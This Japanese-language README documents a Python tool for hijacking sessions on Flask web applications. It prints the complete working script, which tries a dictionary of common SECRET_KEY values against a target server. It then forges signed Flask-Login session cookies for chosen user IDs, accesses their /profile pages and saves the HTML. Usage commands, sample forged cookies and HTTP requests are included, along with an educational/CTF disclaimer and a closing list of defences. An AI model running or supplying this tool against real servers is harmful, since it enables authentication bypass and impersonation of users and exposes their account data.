# セッションハイジャックツール

指定したWEBサーバーに対してセッションハイジャックを実行し、SECRET_KEYを辞書攻撃で見つけるPythonツールです。

## 注意事項

⚠️ **このツールは教育目的および許可された環境でのみ使用してください。**
- 許可されていないサーバーに対する攻撃は違法です
- 自分のサーバーやCTF（Capture The Flag）などの許可された環境でのみ使用してください

## インストール

```bash
pip install -r requirements.txt
```

## 主な機能

### 1. SECRET_KEYの辞書攻撃
- デフォルトのSECRET_KEY候補リストを使用した自動攻撃
- 実際のHTTPリクエストでSECRET_KEYを検証
- 各候補を順次試行し、正しいSECRET_KEYを特定

### 2. セッションデータの偽造
- `_user_id`, `_fresh`, `_id`を含む標準的なFlask-Loginセッションデータ構造の生成
- 指定したユーザーIDでのセッション偽造
- Flaskの`SecureCookieSessionInterface`を使用した署名付きセッションクッキーの生成

### 3. プロフィールページへのアクセス
- 偽造したセッションクッキーを使用して`/profile`エンドポイントにアクセス
- 認証バイパスの成功/失敗を判定
- 成功した場合、HTMLをファイルに保存

### 4. 複数ユーザーIDのサポート
- 単一のユーザーIDまたは範囲（例: `1-5`）を指定可能
- 各ユーザーIDに対して個別にセッションハイジャックを実行
- 各ユーザーIDごとにHTMLファイルを保存

## 使用方法

### 基本的な使用方法

```bash
python 001session_hijack.py -u http://localhost:5000
```

### 特定のユーザーIDを指定

```bash
python 001session_hijack.py -u http://localhost:5000 -i 2
```

### ユーザーIDの範囲を指定

```bash
python 001session_hijack.py -u http://localhost:5000 -i 1-5
```

## オプション

- `-u, --url`: ターゲットURL（必須）
- `-i`: 攻撃対象のユーザーID（オプション、デフォルト: 1）。範囲指定可（例: 1-5）

## 動作原理

1. **コマンドライン引数の解析**: `argparse`を使用してターゲットURLとユーザーIDを取得
2. **ユーザーIDの範囲解析**: `-i`オプションで指定された範囲（例: `1-5`）をパースしてリストに変換
3. **SECRET_KEYの辞書攻撃**: デフォルトのSECRET_KEY候補リストを順次試行し、実際のHTTPリクエストで検証
4. **セッションデータの偽造**: `_user_id`, `_fresh`, `_id`を含む偽造セッションデータを生成
5. **Flaskセッションクッキーの生成**: `SecureCookieSessionInterface`を使用して署名付きのセッションクッキーを生成
6. **プロフィールページへのアクセス**: 偽造したセッションクッキーを使用して`/profile`エンドポイントにアクセス
7. **結果の判定**: レスポンスのステータスコードと内容を確認し、認証バイパスの成功/失敗を判定
8. **HTMLの保存**: 成功した場合、プロフィールページのHTMLを`profile_page_user_{id}.html`として保存

## コード解説

### 主要な関数

#### `parse_user_ids(user_id_str)`
ユーザーID文字列をパースしてリストを返す。`1-5`のような範囲指定の場合は、`['1', '2', '3', '4', '5']`のようなリストに変換。

#### `create_serializer(secret_key)`
Flaskアプリケーションを作成してセッションシリアライザーを取得。`SECRET_KEY`を使用してセッションクッキーの署名・検証に使用されるシリアライザーを返す。

#### `create_session_data(user_id)`
偽造するセッションデータを作成。Flaskの標準的なセッションデータ構造に合わせて、`_user_id`、`_fresh`、`_id`を含む辞書を返す。

#### `discover_secret_key(secret_keys, target_url, test_user_id)`
SECRET_KEYを総当たりで特定。各SECRET_KEY候補に対して実際のHTTPリクエストを送信して検証し、成功したSECRET_KEYを返す。

#### `test_secret_key(secret_key, target_url, test_user_id)`
SECRET_KEYをテストして有効性を確認。生成したセッションクッキーで実際にリクエストを送信し、成功判定を行う。

#### `hijack_user_session(user_id, serializer, target_url)`
指定されたユーザーIDでセッションハイジャックを実行。偽造したセッションクッキーを使用してプロフィールページにアクセスし、成功した場合はHTMLを保存。

#### `is_attack_successful(response)`
レスポンスから攻撃成功を判定。ステータスコード200でログインページでない場合、または302で`/login`以外へのリダイレクトの場合、成功と判定。

#### `make_request_with_cookie(cookie, target_url)`
セッションクッキーでリクエストを送信。偽造したセッションクッキーを設定して`/profile`エンドポイントにアクセス。

## 対応フレームワーク

- Flask（`SecureCookieSessionInterface`を使用）

## デフォルトのSECRET_KEY候補

コード内で定義されているデフォルトのSECRET_KEY候補リスト：

```python
SECRET_KEYS = [
    "secret",
    "secret-key",
    "testkey",
    "ecre-key",
    "your-secret-key-change-in-production",
    "secret-keys",
]
```

これらの候補を順次試行し、実際のHTTPリクエストで検証します。

## セッションハイジャックの技術的詳細

### 全体フロー

```
1. コマンドライン引数の解析
    ↓
2. ユーザーIDの範囲解析
    ↓
3. SECRET_KEY候補リストの定義
    ↓
4. SECRET_KEYの辞書攻撃（各候補を順次試行）
    │
    ├─ 4-1. Flaskアプリケーションの作成
    │      (create_serializer関数)
    │
    ├─ 4-2. セッションシリアライザーの取得
    │      (app.session_interface.get_signing_serializer)
    │
    ├─ 4-3. テスト用セッションデータの作成
    │      (create_session_data関数)
    │
    ├─ 4-4. テスト用セッションクッキーの生成
    │      (serializer.dumps)
    │
    ├─ 4-5. テストリクエストの送信
    │      (make_request_with_cookie関数)
    │
    ├─ 4-6. レスポンスの検証
    │      (is_attack_successful関数)
    │
    └─ 4-7. 成功したSECRET_KEYを返す
    ↓
5. 正しいSECRET_KEYとシリアライザーの取得
    ↓
6. 各ユーザーIDに対してセッションハイジャックを実行
    │
    ├─ 6-1. 偽造セッションデータの作成
    │      (create_session_data関数)
    │      → {"_user_id": user_id, "_fresh": True, "_id": user_id}
    │
    ├─ 6-2. セッションクッキーの生成（署名付き）
    │      (serializer.dumps)
    │      → JSONエンコード → Base64エンコード → HMAC署名 → 結合
    │
    ├─ 6-3. HTTPリクエストの送信（クッキー付き）
    │      (make_request_with_cookie関数)
    │      → GET /profile リクエストに偽造クッキーを付与
    │
    ├─ 6-4. リダイレクト処理（必要に応じて）
    │      → 302リダイレクトの場合はリダイレクト先にアクセス
    │
    ├─ 6-5. レスポンスの検証
    │      (is_attack_successful関数)
    │      → ステータスコードと内容を確認
    │
    ├─ 6-6. サーバー側での検証プロセス
    │      → クッキーの受信
    │      → 署名の検証（HMAC署名の再計算と比較）
    │      → セッションデータの復号（Base64/JSONデコード）
    │      → 認証チェック（_user_idの存在確認）
    │
    └─ 6-7. 成功時のHTML保存
          → profile_page_user_{user_id}.html として保存
    ↓
7. 保護されたリソースへのアクセス成功
```

#### 各ステップの詳細説明

##### ステップ1: コマンドライン引数の解析

**実行箇所**: `main()`関数（105-120行目）

```python
parser = argparse.ArgumentParser(...)
parser.add_argument('-u', '--url', required=True, help='ターゲットURL（必須）')
parser.add_argument('-i', dest='user_id', default='1', ...)
args = parser.parse_args()
```

**処理内容**:
- `-u, --url`: ターゲットURLを取得（必須）
- `-i`: ユーザーIDを取得（オプション、デフォルト: 1）
- 引数を解析して`args`オブジェクトに格納

**出力**: `target_url`, `user_id`文字列

---

##### ステップ2: ユーザーIDの範囲解析

**実行箇所**: `main()`関数（124行目）→ `parse_user_ids()`関数（6-15行目）

```python
target_user_ids = parse_user_ids(args.user_id)
```

**処理内容**:
- `-i`オプションで指定された文字列を解析
- `"1-5"`のような範囲指定の場合は、`['1', '2', '3', '4', '5']`に変換
- 単一IDの場合は、`['1']`のような単一要素のリストに変換

**出力**: ユーザーIDのリスト（例: `['1', '2', '3']`）

---

##### ステップ3: SECRET_KEY候補リストの定義

**実行箇所**: `main()`関数（126-133行目）

```python
SECRET_KEYS = [
    "secret",
    "secret-key",
    "testkey",
    "ecre-key",
    "your-secret-key-change-in-production",
    "secret-keys",
]
```

**処理内容**:
- よくある固定値のSECRET_KEY候補をリストとして定義
- これらの候補を順次試行して、正しいSECRET_KEYを特定

**出力**: SECRET_KEY候補のリスト

---

##### ステップ4: SECRET_KEYの辞書攻撃

**実行箇所**: `main()`関数（141行目）→ `discover_secret_key()`関数（55-71行目）

**4-1. Flaskアプリケーションの作成**

```python
app = Flask(__name__)
app.config['SECRET_KEY'] = secret_key
```

**処理内容**:
- `create_serializer()`関数内で実行
- Flaskアプリケーションインスタンスを作成
- 試行中のSECRET_KEYを設定

**4-2. セッションシリアライザーの取得**

```python
serializer = app.session_interface.get_signing_serializer(app)
```

**処理内容**:
- Flaskの`SecureCookieSessionInterface`から署名付きシリアライザーを取得
- このシリアライザーは、セッションデータを署名付きクッキーに変換するために使用

**4-3. テスト用セッションデータの作成**

```python
session_data = create_session_data(test_user_id)
# → {"_user_id": "1", "_fresh": True, "_id": "1"}
```

**処理内容**:
- `create_session_data()`関数でテスト用のセッションデータを作成
- 最初のユーザーID（`target_user_ids[0]`）を使用

**4-4. テスト用セッションクッキーの生成**

```python
cookie = serializer.dumps(session_data)
```

**処理内容**:
- `serializer.dumps()`でセッションデータを署名付きクッキーに変換
- 内部処理:
  1. JSONエンコード: `{"_user_id": "1", ...}` → `'{"_user_id":"1",...}'`
  2. Base64エンコード: JSON文字列をBase64エンコード
  3. HMAC署名の生成: SECRET_KEYを使用してHMAC-SHA1署名を計算
  4. 結合: `{base64_data}.{timestamp}.{signature}`の形式で結合

**4-5. テストリクエストの送信**

```python
response = make_request_with_cookie(cookie, target_url)
# → GET http://target_url/profile
# → Cookie: session={generated_cookie}
```

**処理内容**:
- `make_request_with_cookie()`関数で実際のHTTPリクエストを送信
- 生成したクッキーを`Cookie`ヘッダーに設定
- `/profile`エンドポイントにアクセス

**4-6. レスポンスの検証**

```python
is_successful = is_attack_successful(response)
```

**処理内容**:
- `is_attack_successful()`関数でレスポンスを検証
- ステータスコード200でログインページでない場合、または302で`/login`以外へのリダイレクトの場合、成功と判定

**4-7. 成功したSECRET_KEYを返す**

```python
if serializer:
    return secret_key, serializer
```

**処理内容**:
- 成功した場合は、そのSECRET_KEYとシリアライザーを返す
- すべて失敗した場合は、警告を表示してデフォルトのSECRET_KEYを使用

**出力**: 正しいSECRET_KEYとシリアライザー

---

##### ステップ5: 正しいSECRET_KEYとシリアライザーの取得

**実行箇所**: `main()`関数（141行目）

```python
used_secret_key, serializer = discover_secret_key(SECRET_KEYS, target_url, target_user_ids[0])
```

**処理内容**:
- `discover_secret_key()`関数の戻り値を受け取る
- 以降の処理で使用するシリアライザーを確定

**出力**: `used_secret_key`（文字列）, `serializer`（シリアライザーオブジェクト）

---

##### ステップ6: 各ユーザーIDに対してセッションハイジャックを実行

**実行箇所**: `main()`関数（144-145行目）→ `hijack_user_session()`関数（74-102行目）

**6-1. 偽造セッションデータの作成**

```python
session_data = create_session_data(user_id)
# → {"_user_id": "2", "_fresh": True, "_id": "2"}
```

**処理内容**:
- 各ユーザーIDに対して、なりすまし用のセッションデータを作成
- Flask-Loginの標準的なセッションデータ構造に合わせる

**6-2. セッションクッキーの生成（署名付き）**

```python
cookie = serializer.dumps(create_session_data(user_id))
```

**処理内容**:
- 正しいSECRET_KEYで署名されたセッションクッキーを生成
- 生成プロセス:
  1. **JSONエンコード**: `{"_user_id": "2", "_fresh": True, "_id": "2"}` → `'{"_user_id":"2","_fresh":true,"_id":"2"}'`
  2. **Base64エンコード**: JSON文字列をBase64エンコード → `eyJfdXNlcl9pZCI6IjIiLCJfZnJlc2giOnRydWUsIl9pZCI6IjIifQ`
  3. **タイムスタンプの追加**: 現在時刻をエンコード → `aS66_g`
  4. **HMAC署名の生成**: SECRET_KEYを使用してHMAC-SHA1署名を計算 → `kPRYHYEhk4vpdOw-XJdsiPsZY34`
  5. **結合**: `{base64_data}.{timestamp}.{signature}`の形式で結合

**生成されるクッキーの例**:
```
eyJfdXNlcl9pZCI6IjIiLCJfZnJlc2giOnRydWUsIl9pZCI6IjIifQ.aS66_g.kPRYHYEhk4vpdOw-XJdsiPsZY34
│─────────── Base64エンコードされたセッションデータ ───────────││timestamp││─── HMAC署名 ───│
```

**6-3. HTTPリクエストの送信（クッキー付き）**

```python
response = make_request_with_cookie(cookie, target_url)
```

**処理内容**:
- `requests.Session()`でHTTPセッションオブジェクトを作成
- `session.cookies.set('session', cookie)`で偽造クッキーを設定
- `session.get(f'{target_url}/profile', allow_redirects=False)`でプロフィールページにアクセス

**送信されるHTTPリクエストの例**:
```
GET /profile HTTP/1.1
Host: localhost:5000
Cookie: session=eyJfdXNlcl9pZCI6IjIiLCJfZnJlc2giOnRydWUsIl9pZCI6IjIifQ.aS66_g.kPRYHYEhk4vpdOw-XJdsiPsZY34
```

**6-4. リダイレクト処理（必要に応じて）**

```python
if response.status_code == 302 and '/login' in response.headers.get('Location', ''):
    redirect_url = response.headers.get('Location', '')
    if not redirect_url.startswith('http'):
        redirect_url = f'{target_url}{redirect_url}'
    response = requests.get(redirect_url, allow_redirects=True)
```

**処理内容**:
- ステータスコード302で`/login`へのリダイレクトの場合、リダイレクト先にアクセス
- 相対URLの場合は絶対URLに変換
- リダイレクトを追跡して最終的なレスポンスを取得

**6-5. レスポンスの検証**

```python
is_successful = is_attack_successful(response)
```

**処理内容**:
- `is_attack_successful()`関数でレスポンスを検証
- **ステータスコード200の場合**:
  - レスポンス本文に「ログイン」「username」「<title>ログイン」の3つすべてが含まれている場合はログインページと判定し、失敗
  - それ以外の場合は成功と判定
- **ステータスコード302の場合**:
  - リダイレクト先が`/login`でない場合は成功と判定
  - `/login`へのリダイレクトの場合は失敗と判定

**6-6. サーバー側での検証プロセス**

サーバー側（Flaskアプリケーション）で実行される処理:

1. **クッキーの受信**:
   - HTTPリクエストから`session`クッキーを取得
   - クッキーの形式: `{base64_data}.{timestamp}.{signature}`

2. **署名の検証**:
   ```python
   # サーバー側の処理（疑似コード）
   server_secret_key = app.config['SECRET_KEY']
   received_signature = cookie.split('.')[-1]  # クッキーから署名を抽出
   calculated_signature = hmac_sha1(server_secret_key, base64_data + timestamp)
   if received_signature == calculated_signature:
       # 署名が有効
   ```
   - サーバーの`SECRET_KEY`を使用してHMAC署名を再計算
   - クッキーに含まれる署名と比較
   - 一致しない場合、クッキーは無効と判定され、認証失敗

3. **セッションデータの復号**:
   ```python
   # サーバー側の処理（疑似コード）
   base64_data = cookie.split('.')[0]
   json_data = base64_decode(base64_data)
   session_data = json_decode(json_data)
   # → {"_user_id": "2", "_fresh": true, "_id": "2"}
   ```
   - 署名が有効な場合、Base64デコードとJSONデコードを実行
   - セッションデータ（`_user_id`など）を取得

4. **認証チェック**:
   ```python
   # サーバー側の処理（疑似コード）
   if '_user_id' in session_data:
       user_id = session_data['_user_id']
       # そのユーザーとして認証済みとみなす
       # 保護されたリソースへのアクセスを許可
   ```
   - `_user_id`が存在するか確認
   - 存在する場合、そのユーザーとして認証済みとみなす
   - 保護されたリソースへのアクセスを許可

**重要なポイント**:
- サーバーは署名の検証のみを行い、クッキーの内容（`_user_id`）が実際のログインセッションから来たものかは検証しない
- 正しいSECRET_KEYで署名されたクッキーは、無条件で有効と判定される
- これがセッションハイジャックの根本的な脆弱性

**6-7. 成功時のHTML保存**

```python
if is_attack_successful(response):
    output_filename = f"profile_page_user_{user_id}.html"
    with open(output_filename, 'w', encoding='utf-8') as f:
        f.write(response.text)
```

**処理内容**:
- 攻撃が成功した場合、取得したHTMLをファイルに保存
- ファイル名は`profile_page_user_{user_id}.html`の形式
- これにより、なりすましたユーザーの情報を後で確認できる

---

##### ステップ7: 保護されたリソースへのアクセス成功

**処理内容**:
- すべてのユーザーIDに対してセッションハイジャックが完了
- 成功した場合は、各ユーザーのプロフィールページのHTMLが保存される
- 攻撃者は、パスワードを知らなくても、任意のユーザーになりすまして保護されたリソースにアクセス可能

### セッションクッキーの生成プロセス

1. **セッションデータの作成**: `{"_user_id": user_id, "_fresh": True, "_id": user_id}`形式の辞書を作成
2. **JSONエンコード**: セッションデータをJSON形式に変換
3. **Base64エンコード**: JSON文字列をBase64エンコード
4. **HMAC署名の生成**: `SECRET_KEY`を使用してHMAC-SHA1署名を生成
5. **結合**: `{base64_data}.{timestamp}.{signature}`の形式で結合

生成されるクッキーの形式:
```
eyJfdXNlcl9pZCI6IjEiLCJfZnJlc2giOnRydWUsIl9pZCI6IjEifQ.aS66_g.kPRYHYEhk4vpdOw-XJdsiPsZY34
│─────────── Base64エンコードされたセッションデータ ───────────││timestamp││─── HMAC署名 ───│
```

### サーバー側での検証プロセス

1. **クッキーの受信**: HTTPリクエストから`session`クッキーを取得
2. **署名の検証**: サーバーの`SECRET_KEY`を使用してHMAC署名を再計算し、クッキーに含まれる署名と比較
3. **セッションデータの復号**: 署名が有効な場合、Base64デコードとJSONデコードを実行してセッションデータを取得
4. **認証チェック**: `_user_id`が存在する場合、そのユーザーとして認証済みとみなす

### SECRET_KEYが固定値の場合の危険性

SECRET_KEYが固定値（推測可能または漏洩）の場合、任意のユーザーIDを指定してセッションクッキーを偽造し、そのユーザーになりすましてログインできます。

**なぜこれが可能なのか**:
- Flaskのセッションクッキーは、SECRET_KEYを使用したHMAC署名によって改ざんを防いでいます
- サーバーは、クッキーに含まれる署名が正しいかどうかだけを検証します
- クッキー内の`_user_id`が実際にログインしたユーザーのIDかどうかは検証しません
- 署名の有効性は、SECRET_KEYが秘密であることに依存しています

**攻撃の流れ**:
1. **SECRET_KEYの取得**: 辞書攻撃や情報漏洩により、サーバーのSECRET_KEYを特定
2. **セッションデータの偽造**: 任意のユーザーIDを指定したセッションデータを作成
3. **署名付きクッキーの生成**: 取得したSECRET_KEYを使用して署名を生成
4. **なりすましの実行**: 偽造したクッキーをHTTPリクエストに含めて送信し、保護されたリソースにアクセス

**防御策**:
- 強力でランダムな`SECRET_KEY`を使用（推測不可能な長いランダム文字列）
- 環境変数やシークレット管理サービスを使用してSECRET_KEYを保護
- セッションクッキーに追加の検証（IPアドレス、User-Agent、セッションタイムスタンプなど）を実装
- セッションIDをランダムで予測不可能な値にする（ユーザーIDをそのまま使用しない）
- セッションタイムアウトを適切に設定
- セッションストア（Redis、データベース）を使用し、サーバー側でセッションの有効性を管理
- 定期的にSECRET_KEYをローテーション（ただし、既存セッションが無効化されることに注意）

## 詳細なコード解説

### インポート部分

```python
import requests
from flask import Flask
import argparse
```

- `requests`: HTTPリクエストを送信するためのライブラリ
- `Flask`: Flaskアプリケーションを作成し、セッションシリアライザーを取得するために使用
- `argparse`: コマンドライン引数を解析するための標準ライブラリ

### 1. `parse_user_ids(user_id_str)` 関数（6-15行目）

```python
def parse_user_ids(user_id_str):
    """ユーザーID文字列をパースしてリストを返す"""
    if '-' in user_id_str:
        try:
            start, end = map(int, user_id_str.split('-', 1))
            return [str(i) for i in range(min(start, end), max(start, end) + 1)]
        except ValueError:
            print(f"[!] 警告: 無効な範囲指定 '{user_id_str}'。単一IDとして扱います。")
            return [user_id_str]
    return [user_id_str]
```

**機能**: ユーザーID文字列を解析してリストに変換

**処理の流れ**:
1. `-`が含まれている場合、範囲指定として扱う
2. `split('-', 1)`で文字列を分割し、`map(int, ...)`で整数に変換
3. `range(min(start, end), max(start, end) + 1)`で範囲を生成し、文字列リストに変換
4. エラーが発生した場合は警告を表示し、単一IDとして扱う
5. `-`が含まれていない場合は、そのまま単一要素のリストとして返す

**例**: `"1-5"` → `['1', '2', '3', '4', '5']`, `"3"` → `['3']`

### 2. `create_serializer(secret_key)` 関数（18-22行目）

```python
def create_serializer(secret_key):
    """Flaskアプリケーションを作成してセッションシリアライザーを取得"""
    app = Flask(__name__)
    app.config['SECRET_KEY'] = secret_key
    return app.session_interface.get_signing_serializer(app)
```

**機能**: Flaskアプリケーションを作成し、セッションシリアライザーを取得

**処理の流れ**:
1. `Flask(__name__)`でFlaskアプリケーションインスタンスを作成
2. `app.config['SECRET_KEY']`に指定されたSECRET_KEYを設定
3. `app.session_interface.get_signing_serializer(app)`で署名付きシリアライザーを取得

**重要なポイント**:
- このシリアライザーは、セッションデータを署名付きクッキーに変換するために使用される
- SECRET_KEYが正しければ、サーバーが検証可能なクッキーを生成できる

### 3. `create_session_data(user_id)` 関数（25-27行目）

```python
def create_session_data(user_id):
    """偽造するセッションデータを作成"""
    return {"_user_id": user_id, "_fresh": True, "_id": user_id}
```

**機能**: 偽造するセッションデータを作成

**データ構造**:
- `_user_id`: なりすましたいユーザーのID（文字列形式）
- `_fresh`: セッションが「新鮮」であることを示すフラグ（通常は`True`）
- `_id`: セッションID（この場合、ユーザーIDと同じ）

**なぜこの構造なのか**:
- Flask-Loginなどの認証拡張機能が使用する標準的なセッションデータ構造
- サーバー側の認証ミドルウェアが`_user_id`を確認してユーザーを識別する

### 4. `is_attack_successful(response)` 関数（30-37行目）

```python
def is_attack_successful(response):
    """レスポンスから攻撃成功を判定"""
    if response.status_code == 200:
        text = response.text
        return not ('ログイン' in text and 'username' in text.lower() and '<title>ログイン' in text)
    elif response.status_code == 302:
        return '/login' not in response.headers.get('Location', '').lower()
    return False
```

**機能**: レスポンスから攻撃成功を判定

**判定ロジック**:
1. **ステータスコード200の場合**: 
   - レスポンス本文に「ログイン」「username」「<title>ログイン」の3つすべてが含まれている場合はログインページと判定し、失敗
   - それ以外の場合は成功と判定
2. **ステータスコード302の場合**:
   - リダイレクト先が`/login`でない場合は成功と判定
   - `/login`へのリダイレクトの場合は失敗と判定
3. **その他のステータスコード**: 失敗と判定

### 5. `make_request_with_cookie(cookie, target_url)` 関数（40-44行目）

```python
def make_request_with_cookie(cookie, target_url):
    """セッションクッキーでリクエストを送信"""
    session = requests.Session()
    session.cookies.set('session', cookie)
    return session.get(f'{target_url}/profile', allow_redirects=False)
```

**機能**: セッションクッキーでリクエストを送信

**処理の流れ**:
1. `requests.Session()`でHTTPセッションオブジェクトを作成
2. `session.cookies.set('session', cookie)`で偽造したセッションクッキーを設定
3. `session.get(f'{target_url}/profile', allow_redirects=False)`でプロフィールページにアクセス
4. `allow_redirects=False`により、リダイレクトを自動的に追跡せず、最初のレスポンスを取得

### 6. `test_secret_key(secret_key, target_url, test_user_id)` 関数（47-52行目）

```python
def test_secret_key(secret_key, target_url, test_user_id):
    """SECRET_KEYをテストして有効性を確認"""
    serializer = create_serializer(secret_key)
    cookie = serializer.dumps(create_session_data(test_user_id))
    response = make_request_with_cookie(cookie, target_url)
    return serializer if is_attack_successful(response) else None
```

**機能**: SECRET_KEYをテストして有効性を確認

**処理の流れ**:
1. `create_serializer(secret_key)`でシリアライザーを取得
2. `create_session_data(test_user_id)`でセッションデータを作成
3. `serializer.dumps(...)`でセッションデータを署名付きクッキーに変換
4. `make_request_with_cookie(...)`で実際にリクエストを送信
5. `is_attack_successful(...)`で成功判定を行い、成功した場合はシリアライザーを返す

### 7. `discover_secret_key(secret_keys, target_url, test_user_id)` 関数（55-71行目）

```python
def discover_secret_key(secret_keys, target_url, test_user_id):
    """SECRET_KEYを総当たりで特定"""
    print("\n[*] 試行するSECRET_KEY候補:")
    for i, key in enumerate(secret_keys, 1):
        print(f"  {i}. {key}")
    
    for secret_key in secret_keys:
        print(f"\n[*] SECRET_KEYを試行: {secret_key}")
        serializer = test_secret_key(secret_key, target_url, test_user_id)
        if serializer:
            print(f"  [OK] SECRET_KEY '{secret_key}' が正しいです！")
            return secret_key, serializer
        print(f"  [NG] SECRET_KEY '{secret_key}' では失敗")
    
    print(f"\n[!] 警告: すべてのSECRET_KEYで失敗しました")
    print(f"[!] デフォルトのSECRET_KEY '{secret_keys[0]}' を使用します")
    return secret_keys[0], create_serializer(secret_keys[0])
```

**機能**: SECRET_KEYを総当たりで特定

**処理の流れ**:
1. 試行するSECRET_KEY候補を表示
2. 各SECRET_KEY候補に対して順次試行:
   - `test_secret_key(...)`で実際のHTTPリクエストを送信して検証
   - 成功した場合は、そのSECRET_KEYとシリアライザーを返す
   - 失敗した場合は次の候補を試行
3. すべて失敗した場合は警告を表示し、デフォルトのSECRET_KEYを使用

### 8. `hijack_user_session(user_id, serializer, target_url)` 関数（74-102行目）

```python
def hijack_user_session(user_id, serializer, target_url):
    """指定されたユーザーIDでセッションハイジャックを実行"""
    print(f"\n{'='*80}")
    print(f"[*] ユーザーID {user_id} でセッションハイジャックを試行中...")
    print(f"{'='*80}")
    
    cookie = serializer.dumps(create_session_data(user_id))
    print(f"[*] 偽造したセッションクッキー: {cookie[:60]}...")
    
    response = make_request_with_cookie(cookie, target_url)
    print(f"ステータスコード: {response.status_code}")
    
    if response.status_code == 302 and '/login' in response.headers.get('Location', ''):
        redirect_url = response.headers.get('Location', '')
        if not redirect_url.startswith('http'):
            redirect_url = f'{target_url}{redirect_url}'
        response = requests.get(redirect_url, allow_redirects=True)
    
    if is_attack_successful(response):
        print("[+] 攻撃成功: 認証をバイパスしました")
        output_filename = f"profile_page_user_{user_id}.html"
        try:
            with open(output_filename, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(f"[*] HTML情報を {output_filename} に出力しました")
        except Exception as e:
            print(f"[!] HTML情報の出力エラー: {e}")
    else:
        print("[*] 攻撃失敗: 認証が必要です")
```

**機能**: 指定されたユーザーIDでセッションハイジャックを実行

**処理の流れ**:
1. ユーザーIDを表示
2. `serializer.dumps(create_session_data(user_id))`で偽造セッションクッキーを生成
3. `make_request_with_cookie(...)`でプロフィールページにアクセス
4. ステータスコード302で`/login`へのリダイレクトの場合:
   - リダイレクト先のURLを取得
   - 相対URLの場合は絶対URLに変換
   - リダイレクト先にアクセスして最終的なレスポンスを取得
5. `is_attack_successful(...)`で成功判定:
   - 成功した場合: HTMLを`profile_page_user_{user_id}.html`として保存
   - 失敗した場合: 失敗メッセージを表示

### 9. `main()` 関数（105-145行目）

```python
def main():
    parser = argparse.ArgumentParser(
        description='WEBサーバーに対するセッションハイジャックツール',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用例:
  python 001session_hijack.py -u http://localhost:5000
  python 001session_hijack.py --url http://example.com:8080
  python 001session_hijack.py -u http://localhost:5000 -i 2
  python 001session_hijack.py -u http://localhost:5000 -i 1-2
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='ターゲットURL（必須）')
    parser.add_argument('-i', dest='user_id', default='1', 
                       help='攻撃対象のユーザーID（デフォルト: 1）。範囲指定可（例: 1-2）')
    
    args = parser.parse_args()
    target_url = args.url.rstrip('/')
    target_user_ids = parse_user_ids(args.user_id)
    
    SECRET_KEYS = [
        "secret",
        "secret-key",
        "testkey",
        "ecre-key",
        "your-secret-key-change-in-production",
        "secret-keys",
    ]
    
    print("="*80)
    print("SECRET_KEYの特定とセッションハイジャック")
    print("="*80)
    print(f"\n[*] ターゲットURL: {target_url}")
    print(f"[*] 攻撃対象のユーザーID: {', '.join(target_user_ids)} (合計{len(target_user_ids)}個)")
    
    used_secret_key, serializer = discover_secret_key(SECRET_KEYS, target_url, target_user_ids[0])
    print(f"\n[*] 使用したSECRET_KEY: {used_secret_key}")
    
    for user_id in target_user_ids:
        hijack_user_session(user_id, serializer, target_url)
```

**機能**: メイン処理を実行

**処理の流れ**:
1. **コマンドライン引数の解析**:
   - `-u, --url`: ターゲットURL（必須）
   - `-i`: ユーザーID（オプション、デフォルト: 1）
2. **URLの正規化**: `rstrip('/')`で末尾のスラッシュを削除
3. **ユーザーIDの解析**: `parse_user_ids(...)`で範囲指定をパース
4. **SECRET_KEY候補の定義**: よくある固定値をリストとして定義
5. **SECRET_KEYの特定**: `discover_secret_key(...)`で実際のHTTPリクエストを送信して検証
6. **セッションハイジャックの実行**: 各ユーザーIDに対して`hijack_user_session(...)`を実行

### 実行エントリーポイント（148-149行目）

```python
if __name__ == '__main__':
    main()
```

**機能**: スクリプトが直接実行された場合に`main()`関数を呼び出す

**重要なポイント**:
- この条件により、このファイルがモジュールとしてインポートされた場合は`main()`が実行されない
- 直接実行された場合のみ、メイン処理が開始される

## ライセンス

教育目的のみ。使用は自己責任でお願いします。
